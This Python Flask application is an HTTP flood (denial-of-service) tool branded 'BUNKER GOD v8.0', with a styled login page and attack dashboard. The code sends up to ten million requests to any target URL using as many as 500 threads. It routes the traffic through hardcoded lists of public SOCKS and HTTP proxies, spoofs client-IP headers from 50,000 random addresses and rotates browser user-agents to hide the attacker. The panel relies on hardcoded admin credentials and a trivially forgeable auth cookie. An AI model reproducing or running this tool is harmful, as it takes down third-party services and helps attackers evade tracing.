from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}

# ⚡ PROXY POOLS
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
    "103.152.232.34:1080","45.127.248.127:1080","139.99.237.62:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
    "184.178.172.5:4145","72.221.164.35:4145","98.162.25.29:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []
custom_proxy_enabled = True

# ============================================
# 🛡️ 50000 FAKE IPs FOR DIRECT MODE
# ============================================
def gen_fake_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

FAKE_IPS = [gen_fake_ip() for _ in range(50000)]

# ============================================
# 🎭 30 BROWSER FINGERPRINTS
# ============================================
BROWSERS = [
    # Chrome
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Windows","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36","Windows","Chrome"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","macOS","Chrome"),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Linux","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","Windows 11","Chrome"),
    # Firefox
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0","Windows","Firefox"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0","macOS","Firefox"),
    ("Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Linux","Firefox"),
    # Safari
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","macOS","Safari"),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","iOS","Safari"),
    ("Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","iOS","Safari"),
    # Edge
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0","Windows","Edge"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0","macOS","Edge"),
    # Opera
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0","Windows","Opera"),
    # Brave
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Windows","Brave"),
    # Samsung
    ("Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/120.0.0.0 Mobile Safari/537.36","Android","Samsung"),
    # Mobile Chrome
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","Android","Chrome"),
    ("Mozilla/5.0 (Linux; Android 13; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36","Android","Chrome"),
    # UC Browser
    ("Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 UCBrowser/13.7.0.1300","Android","UC"),
    # Vivaldi
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5","Windows","Vivaldi"),
]

# ============================================
# 💀 GOD LEVEL REQUEST - ALL MODES IP HIDDEN
# ============================================
def god_request(url, proxy_info=None):
    """GOD LEVEL: ALL modes hide real IP"""
    try:
        ua, os_name, browser = random.choice(BROWSERS)
        fake_ip = random.choice(FAKE_IPS)
        
        headers = {
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            # 🔥 SPOOFED IP HEADERS
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Client-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "True-Client-IP": fake_ip,
            "Forwarded": f"for={fake_ip};proto=https",
        }
        
        session = requests.Session()
        
        if proxy_info:
            ptype, paddr = proxy_info
            host, port = paddr.split(":")
            port = int(port)
            
            if ptype == "socks5":
                session.proxies = {"http":f"socks5h://{host}:{port}","https":f"socks5h://{host}:{port}"}
            elif ptype == "socks4":
                session.proxies = {"http":f"socks4://{host}:{port}","https":f"socks4://{host}:{port}"}
            else:
                session.proxies = {"http":f"http://{host}:{port}","https":f"http://{host}:{port}"}
        
        # ULTRA FAST - No timeout delay
        response = session.get(url, headers=headers, timeout=5, verify=False)
        return True
    except:
        return False

# ============================================
# ⚡ GOD WORKER - MAXIMUM SPEED
# ============================================
def god_worker(attack_id, url, count, mode):
    """GOD worker - 0 delay for max speed"""
    
    # Build proxy pool
    all_proxies = []
    if custom_proxy_enabled:
        for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
        for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
        for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        # Random proxy OR direct with fake IP
        proxy_info = random.choice(all_proxies) if all_proxies else None
        
        # Mode selection
        if mode == "direct":
            proxy_info = None  # Force direct with fake IP headers
        
        if god_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        # Update counter
        if attack_id in attack_counters:
            attack_counters[attack_id] = {
                "done": i+1, "total": count,
                "success": success, "fail": fail,
                "ip": "HIDDEN"
            }
        
        # Log every 500
        if i % 500 == 0 and i > 0:
            attack_logs.append(f"⚡ [{i}/{count}] ✅{success} ❌{fail} | IP: HIDDEN")

# ============================================
# 🚀 GOD LAUNCH
# ============================================
def run_god_attack(attack_id, url, count, speed, mode):
    """GOD attack - ULTRA FAST"""
    workers_map = {"slow": 20, "fast": 50, "ultra": 150, "flash": 300, "god": 500}
    workers = workers_map.get(speed, 150)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"⚡ GOD MODE: {url[:40]}...")
    attack_logs.append(f"🔥 {count} REQ | {speed.upper()} | {workers} Workers")
    attack_logs.append(f"🛡️ ALL MODES IP HIDDEN | 50000 Fake IPs")
    
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0, "ip": "HIDDEN"}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(god_worker, attack_id, url, req_per_worker, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    if attack_id in attack_counters: del attack_counters[attack_id]
    
    attack_logs.append(f"🏁 GOD DONE: ✅{attack_stats['success']} ❌{attack_stats['failed']}")

# ============================================
# 🎨 BEAUTIFUL BIG UI - v8.0
# ============================================
LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER GOD v8.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.04) 1px,transparent 1px);background-size:40px 40px;animation:bg 15s linear infinite}
@keyframes bg{0%{transform:translate(0)}100%{transform:translate(40px,40px)}}
.box{background:rgba(10,0,0,0.97);padding:60px 50px;border-radius:24px;border:3px solid rgba(255,0,0,0.6);width:440px;text-align:center;z-index:1;box-shadow:0 0 120px rgba(255,0,0,0.4);position:relative}
.box::before{content:'';position:absolute;top:-4px;left:-4px;right:-4px;bottom:-4px;border-radius:28px;background:linear-gradient(45deg,#f00,#ff0,#0f0,#0ff,#f00);z-index:-1;animation:rot 2s linear infinite;opacity:0.5;filter:blur(15px)}
@keyframes rot{0%{filter:blur(15px) hue-rotate(0)}100%{filter:blur(15px) hue-rotate(360)}}
.logo{font-size:5em;animation:bounce 0.8s infinite}@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-20px)}}
h1{font-size:2.5em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:5px;margin:10px 0}
.tag{color:#f44;font-size:0.8em;letter-spacing:6px;margin:12px 0}
input{width:100%;padding:18px;background:rgba(0,0,0,0.9);border:2px solid rgba(255,0,0,0.5);border-radius:14px;color:#f44;margin:12px 0;font-size:16px;font-family:monospace;transition:0.3s}
input:focus{border-color:#0f0;box-shadow:0 0 30px rgba(0,255,0,0.3);outline:none}
.btn{width:100%;padding:20px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:14px;font-weight:800;cursor:pointer;font-size:18px;margin-top:15px;letter-spacing:4px;text-transform:uppercase;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#f00,#f44);box-shadow:0 0 60px rgba(255,0,0,0.8);transform:translateY(-4px)}
</style></head><body>
<div class="bg"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BUNKER GOD</h1>
<div class="tag">v8.0 • GOD LEVEL</div>
<p style="color:#888;font-size:0.65em;letter-spacing:2px">500 WORKERS • 50000 FAKE IPs • ALL MODES HIDDEN</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ENTER GOD MODE</button>
</form>
{% if error %}<p style="color:#f00;margin-top:12px;font-size:0.9em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER GOD v8.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:15px}
.container{max-width:1400px;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:25px 30px;border:3px solid rgba(255,0,0,0.6);border-radius:18px;margin-bottom:20px;background:rgba(10,0,0,0.97);flex-wrap:wrap;gap:15px;box-shadow:0 0 50px rgba(255,0,0,0.3)}
.header h1{font-size:2em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:15px;margin-bottom:20px}
.stat{background:rgba(10,0,0,0.97);border:2px solid rgba(255,0,0,0.4);border-radius:16px;padding:25px;text-align:center;transition:0.3s}
.stat:hover{border-color:#0f0;box-shadow:0 0 30px rgba(0,255,0,0.3)}
.stat-val{font-size:3em;font-weight:900}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}
.stat-label{font-size:0.7em;color:#888;text-transform:uppercase;letter-spacing:4px;margin-top:6px}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:18px;margin-bottom:20px}
.card{background:rgba(10,0,0,0.97);border:2px solid rgba(255,0,0,0.4);border-radius:16px;padding:28px;transition:0.3s}
.card:hover{border-color:rgba(0,255,0,0.4)}
.card h3{color:#ff0;margin-bottom:18px;font-size:1em;letter-spacing:3px;text-transform:uppercase}
input,select,textarea{width:100%;padding:16px;background:#000;border:2px solid rgba(255,0,0,0.5);border-radius:12px;color:#f44;margin:6px 0;font-size:14px;font-family:monospace;transition:0.3s}
input:focus,select:focus,textarea:focus{border-color:#0f0;box-shadow:0 0 25px rgba(0,255,0,0.2);outline:none}
label{font-size:0.65em;color:#888;text-transform:uppercase;letter-spacing:2px;display:block;margin-top:10px}
.btn{width:100%;padding:18px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:12px;font-weight:800;cursor:pointer;margin:6px 0;font-size:0.9em;text-transform:uppercase;letter-spacing:3px;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#f00,#f44);box-shadow:0 0 40px rgba(255,0,0,0.6);transform:translateY(-3px)}
.btn:active{transform:scale(0.95)}
.btn-god{background:linear-gradient(135deg,#ff0,#f80);color:#000;font-size:1em;padding:22px}
.btn-god:hover{box-shadow:0 0 50px rgba(255,215,0,0.8)}
.btn-stop{background:#222;color:#f00;border:2px solid #f00;font-size:1em;padding:22px}
.btn-green{background:linear-gradient(135deg,#0a0,#0f0);color:#000}
.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.logs{background:#000;border:2px solid rgba(255,0,0,0.3);border-radius:12px;padding:16px;max-height:300px;overflow:auto;font-size:0.7em;font-family:monospace;color:#0f0}
.log-e{padding:4px 0;border-bottom:1px solid #111;color:#aaa}
.counter{font-size:1.6em;color:#ff0;text-align:center;padding:15px;font-family:monospace;background:rgba(10,0,0,0.9);border-radius:12px;margin-top:12px;font-weight:bold}
.badge{display:inline-block;padding:6px 16px;border-radius:20px;font-size:0.6em;font-weight:800;letter-spacing:2px}
.badge-god{background:rgba(255,215,0,0.1);color:#ff0;border:2px solid rgba(255,215,0,0.4);animation:glow 0.8s infinite}
@keyframes glow{50%{box-shadow:0 0 30px rgba(255,215,0,0.5)}}
.toggle-row{display:flex;align-items:center;gap:12px;margin:8px 0;padding:10px;background:rgba(0,0,0,0.5);border-radius:10px}
.toggle{width:50px;height:28px;background:#333;border-radius:14px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#0f0;box-shadow:0 0 20px rgba(0,255,0,0.4)}
.toggle::after{content:'';position:absolute;top:3px;left:3px;width:22px;height:22px;background:#fff;border-radius:50%;transition:0.3s}
.toggle.on::after{left:25px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BUNKER GOD v8.0</h1><div style="color:#888;font-size:0.65em;letter-spacing:3px">500 WORKERS • 50000 FAKE IPs • ALL MODES IP HIDDEN</div></div>
<div style="display:flex;gap:12px;align-items:center">
<span class="badge badge-god">⚡ GOD MODE</span>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.8em;font-weight:800">⏻ EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
</div>

<div class="grid">
<div class="card">
<h3>🎯 GOD ATTACK</h3>
<label>🎯 TARGET URL</label>
<input type="text" id="url" placeholder="https://target.com/api">
<div class="row">
<div><label>📊 REQUESTS</label><input type="number" id="count" value="50000"></div>
<div><label>⚡ SPEED</label>
<select id="speed">
<option value="slow">🐢 Slow (20w)</option>
<option value="fast">⚡ Fast (50w)</option>
<option value="ultra" selected>💀 ULTRA (150w)</option>
<option value="flash">⚡ FLASH (300w)</option>
<option value="god">👑 GOD (500w)</option>
</select></div>
</div>
<label>🛡️ MODE (ALL IP HIDDEN)</label>
<select id="mode">
<option value="direct">🔒 DIRECT (Fake IP Headers)</option>
<option value="socks5">🔐 SOCKS5 Proxy</option>
<option value="socks4">🔐 SOCKS4 Proxy</option>
<option value="http">🌐 HTTP Proxy</option>
<option value="mixed">💀 MIXED</option>
<option value="all" selected>☠️ ALL METHODS</option>
</select>

<div class="toggle-row">
<span style="font-size:0.7em;color:#fff;font-weight:600">🔧 CUSTOM PROXY</span>
<div class="toggle on" id="proxyToggle" onclick="toggleProxy()"></div>
<span id="proxyLabel" style="font-size:0.7em;color:#0f0;font-weight:600">ON</span>
</div>

<label>🔧 CUSTOM PROXIES (IP:Port per line)</label>
<textarea id="customProxies" rows="2" placeholder="socks5://ip:port&#10;socks4://ip:port&#10;http://ip:port"></textarea>
<button class="btn btn-green" onclick="saveProxies()">💾 SAVE PROXIES</button>
<button class="btn btn-god" onclick="start()">⚡ LAUNCH GOD ATTACK</button>
<button class="btn btn-stop" onclick="stop()">⏹️ TERMINATE</button>
<div class="counter" id="liveCounter">💀 READY FOR GOD MODE</div>
</div>

<div class="card">
<h3>📊 LIVE STATS</h3>
<div class="row">
<div class="stat"><div class="stat-val t" style="font-size:1.8em" id="successRate">0%</div><div class="stat-label">SUCCESS RATE</div></div>
<div class="stat"><div class="stat-val s" style="font-size:1.8em" id="rps">0</div><div class="stat-label">REQ/SEC</div></div>
</div>
<div style="margin-top:15px;color:#0f0;font-size:0.7em;text-align:center;line-height:2.2">
👑 <span style="color:#ff0">GOD MODE: 500 WORKERS</span><br>
🎭 <span style="color:#f44">20 BROWSER FINGERPRINTS</span><br>
🛡️ <span style="color:#0f0">50000 FAKE IPs ROTATION</span><br>
🔒 <span style="color:#ff0">ALL MODES IP HIDDEN</span><br>
💀 <span style="color:#f00">REAL IP: 100% INVISIBLE</span>
</div>
</div>
</div>

<div class="card"><h3>📜 GOD LOGS</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER GOD v8.0 READY</div><div class="log-e">👑 500 Workers • 50000 Fake IPs • All Modes Hidden</div><div class="log-e">🛡️ DIRECT Mode: Fake IP Headers Active</div><div class="log-e">⚡ AWAITING COMMAND...</div></div></div>
</div>

<script>
var cpOn=true,lt=0,ltm=Date.now(),ci=null;

function toggleProxy(){cpOn=!cpOn;document.getElementById('proxyToggle').classList.toggle('on',cpOn);var l=document.getElementById('proxyLabel');l.textContent=cpOn?'ON':'OFF';l.style.color=cpOn?'#0f0':'#f00';fetch('/toggle_proxy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:cpOn})})}

function saveProxies(){var p=document.getElementById('customProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>alert('✅ '+d.count+' Proxies Saved'))}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;
var t=d.success+d.failed;document.getElementById('successRate').textContent=t>0?((d.success/t)*100).toFixed(1)+'%':'0%';
var n=Date.now(),dt=n-ltm;if(dt>0){document.getElementById('rps').textContent=Math.floor((d.total-lt)/(dt/1000));lt=d.total;ltm=n;}
})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

function c(){fetch('/counter').then(r=>r.json()).then(d=>{
if(d.active){document.getElementById('liveCounter').textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+' ❌'+d.fail+'] | IP: '+d.ip}
else{document.getElementById('liveCounter').textContent='💀 READY'}
})}

function start(){
var url=document.getElementById('url').value,count=document.getElementById('count').value;
var speed=document.getElementById('speed').value,mode=document.getElementById('mode').value;
if(!url){alert('🎯 Enter Target URL!');return}
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode})}).then(r=>r.json()).then(d=>{
l();u();if(ci)clearInterval(ci);ci=setInterval(c,100)})}

function stop(){fetch('/stop',{method:'POST'}).then(()=>{if(ci){clearInterval(ci);ci=null}document.getElementById('liveCounter').textContent='⏹️ TERMINATED';l()})}

setInterval(function(){l();u()},500)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/toggle_proxy', methods=['POST'])
def toggle_proxy():
    global custom_proxy_enabled
    d = request.get_json()
    custom_proxy_enabled = d.get('enabled', True)
    return jsonify({"status":"ok","enabled":custom_proxy_enabled})

@app.route('/save_proxies', methods=['POST'])
def save_proxies():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok","count":len(custom_proxies)})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),10000000)
    speed = d.get('speed','ultra')
    mode = d.get('mode','all')
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"god_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_god_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","speed":speed,"mode":mode})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    for aid in active_attacks:
        if aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats(): return jsonify(attack_stats)

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BUNKER GOD v8.0")
    print(f"👑 Workers: 500 (GOD)")
    print(f"🎭 Browsers: {len(BROWSERS)}")
    print(f"🛡️ Fake IPs: {len(FAKE_IPS)}")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
